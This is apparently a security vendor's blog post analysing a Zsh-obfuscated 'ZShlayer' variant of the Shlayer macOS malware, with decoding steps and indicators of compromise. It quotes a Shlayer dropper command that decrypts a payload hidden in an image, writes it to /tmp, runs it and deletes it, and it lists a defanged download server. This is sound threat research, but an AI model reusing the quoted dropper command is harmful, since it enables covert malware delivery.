@@ -1,0 +1,121 @@
+Earlier this year, we discussed how threat actors have been turning to scripting languages as a preferred means of both dropping malware and executing payloads. That trend has continued with some interesting innovations in response to the static detection signatures now widely in use both by Apple and other vendors. A recent variant of the Shlayer malware follows Apple’s lead in preferring Zsh to Bash as its default shell language and employs a novel encoding method to avoid detection. In this post, we describe this variant and show how it can be decoded to reveal the telltale Shlayer signature.
+
+Didn’t We Just Hear About Shlayer?
+
+Shlayer is perhaps the most talked about macOS malware at the moment and hit the news again recently after being caught sneaking past Apple’s macOS Notarization checks. That version of Shlayer was an interesting diversion: using a Mach-O binary written in C++ to execute a Bash shell script in memory. That might well suggest that Apple’s Notarization checks are static rather than dynamic as the telltale Shlayer code is only evident once the packed binary runs:
+
+sh -c “tail -c +1381 "/Volumes/Install/Installer.app/Contents/Resources/main.png" | openssl enc -aes-256-cbc -salt -md md5 -d -A -base64 -out /tmp/ZQEifWNV2l -pass "pass:0.6effariGgninthgiL0.6" && chmod 777 /tmp/ZQEifWNV2l && /tmp/ZQEifWNV2l "/Volumes/Install/Installer.app/Contents/MacOS/pine" && rm -rf /tmp/ZQEifWNV2l”
+
+The classic Shlayer technique is clearly evident here: passing encrypted and password-protected code to openssl and then writing that out as a payload to the /tmp folder.
+
+But Shlayer has been up to other tricks since June of 2020 that have been helping it avoid the static signatures employed by most vendors. Although bypassing Apple’s Notarization checks is obviously a headline grabber, this new variant of Shlayer utilizes heavily obfuscated Zsh scripts and is in fact far more prolific in the wild. Let’s take a look at how this new variant works.
+
+Inside the New ZShlayer Variant
+
+Whereas earlier versions of Shlayer like Shlayer.a came as shell script executables on a removable .DMG disk image, the new ZShlayer malware goes back to using a standard Apple application bundle inside the .DMG.
+
+In place of a Mach-O in the MacOS folder, we instead find this heavily obfuscated Zsh script (only partially shown in the image below):
+
+In the Resources folder, we find two base64 encoded text files.
+
+The entire bundle is codesigned, but it is has not been notarized, indicating that the malware is either intended as a payload for 10.14 or earlier installations or that victims will have to be socially engineered to override the Notarization check. Unlike many other samples we have seen since Catalina was released last year, this one did not include graphical instructions to help the user bypass Apple’s built-in security checks.
+
+This particular sample ( c561d62c786c757a660c47d133b6d23e030a40c4aa08aebe44b8c4a7711da580 ), which dates back to early August, has already had its certificate revoked by Apple.
+
+Despite that, due to the use of the Zsh obfuscation, it’s not particularly well-recognized by static signature scanners on VirusTotal, even as of today.
+
+Decoding the First Stage, Zsh Script Payload
+
+In the following, we’ll use this as for our example:
+
+05b0a4a31f38225d5ad9d133d08c892645639c4661b3e239ef2094381366cb62
+
+But the same general method should work across all ZShlayer samples noted at the end of this post.
+
+The Zsh script located in the bundle’s MacOS folder may seem fairly impenetrable at first glance, as indeed it is intended to:
+
+Seeing from the shebang that it’s a shell script, however, immediately tells us that we can isolate each command by introducing a line break at every semicolon.
+
+In BBEdit or similar text editor, we can simply search and replace every semicolon with a semicolon and newline:
+
+Looking toward the end of that output, we can clearly see now where the variable definitions end and the execution logic begins, at line 164:
+
+Note in particular the variable TWm , defined on the penultimate line and executed at line 164. This variable name will prove key as we try to deobfuscate the code.
+
+In order to do that, we’ll first save this modified version of the script with the linebreaks to local disk so that we can use it as input to a python script for decoding. Our script will first of all replace all the variable names with the actual unicode values. Now the line that gets executed looks something like this:
+
+We can echo that code on the command line and print out the unicode in plain text using printf . The full ZShlayer_decode.py script is available here. Here’s what all the above looks like.
+
+And the output:
+
+ZShlayer Second-Stage Payload
+
+You’ll notice from the output that the decoded Zsh script takes as input only the smaller of the two encoded files from the Resources folder; in this case, the smaller file is called “tun_kibitzers_Babbitt”. If we echo the output from this decoded script to the command line, we’ll see why:
+
+Our ZShlayer script decodes into a trademark Shlayer Bash script which now takes the larger file (here called “profanations_detraction”) and outputs it to a newly-created application bundle in the /tmp folder. Classic Shlayer behavior.
+
+Let’s take that script and comment out the last two lines so that we can get the output while still preventing execution:
+
+The unzipped Player.app now in the /tmp folder looks like a duplicate of the one on the original disk image, with the same executable name as the parent and another Bash script in the Resources folder also called “tun_kibitzers_Babbitt” (in this case). However, note the size is different:
+
+Decoding the new script shows that it drops and executes yet another layer of Bash shell scripting. Here’s the head and tail (sandwiched between the two is a huge chunk of base64):
+
+If you followed (or want to check out) our earlier Scripting Macs with Malice post, you’ll recognize that this is the Shlayer.d variant we wrote about there. The output of
+
+"$(_m "$_t" "$_y")"
+
+is almost identical to the Shlayer.d sample we wrote about earlier; the most significant difference being a new URL from which to retrieve the final payload:
+
+http[:]//dqb2corklaq0k[.]cloudfront[.]net/
+
+13[.]226[.]23[.]203
+
+The final payload from this point depends on the context of the executing device. As can be seen above, the script gathers OS version, a session UID and machine ID, all of which it posts to the server for processing.
+
+The server, which appears to have been up for at least two months, is not recognized as malicious on VirusTotal and is currently active with a 200 status code.
+
+As Shlayer payloads have been discussed in detail by other researchers, we refer further analysis of the final payload to already published work such as here and here.
+
+How Prevalent is ZShlayer in the Wild?
+
+Searching for ZShlayer on VirusTotal reveals a large number of individual samples and shows that this variant has been active since late June 2020. As of today, our latest retrohunt showed 172 samples. Some of the parent DMGs of these samples have a reputation score of 0/58 on VT.
+
+Conclusion
+
+The ZShlayer variant of the Shlayer malware on top of the recent Shlayer campaign abusing Apple’s Notarization service is clear evidence that these threat actors are continuing to evolve and are pursuing multiple campaigns against macOS users. A multi-engined behavioral AI solution that can detect malware based on its behavior rather than relying solely on file characteristics continues to be the best way to protect your macOS fleet. If you would like to see how SentinelOne can help protect your business, contact us today or request a free demo.
+
+Indicators of Compromise
+
+ZShlayer Scripts
+
+269d5f15da3bc3522ca53a3399dbaf4848f86de35d78c636a78336d46c23951c
+
+e3292268c1d0830e76c3e80b4ea57921b9171027e07f064ef3b867b6d0450191
+
+93ff20ff59d4e82e9c0e3b08037c48886dc54b8ed37c19894e0a65c1af8612f6
+
+c561d62c786c757a660c47d133b6d23e030a40c4aa08aebe44b8c4a7711da580
+
+16885c2443b610d80b30828b1445ca326adb727c48f06d073e4dcb70fe3e5c2e
+
+1bc5d3cb3d885fad8230e01dc5f86145d16ed5552a0fa8725689635b96b681e1
+
+Parent DMGs
+
+f6cb7f9593d85f0cd1e81d5b9f520b74d9bf5e829206cefe05b956c0f7638c28
+
+3e20c0b2979a368c7d38cf305f1f60693375165bb76150ad80dbd34e7e0550ed
+
+c319761789afb6aa9cddadf340dfa2d4d659e4b420d6dfde9640cdc4c1d813b7
+
+823c4d39b0d93a1358b4fa02539868944ce15df91f78a1142be26edf07a64a5a
+
+45d50559f73e7c12f1d9aa06283182cb67ac953d285f044e77447569ca8a278c
+
+f94c8712dd7716cfeac79e6e59fdca07db4452c5d239593f421f97246ee8ef41
+
+Domains
+
+http[:]//dqb2corklaq0k[.]cloudfront[.]net/
+
+13[.]226[.]23[.]203
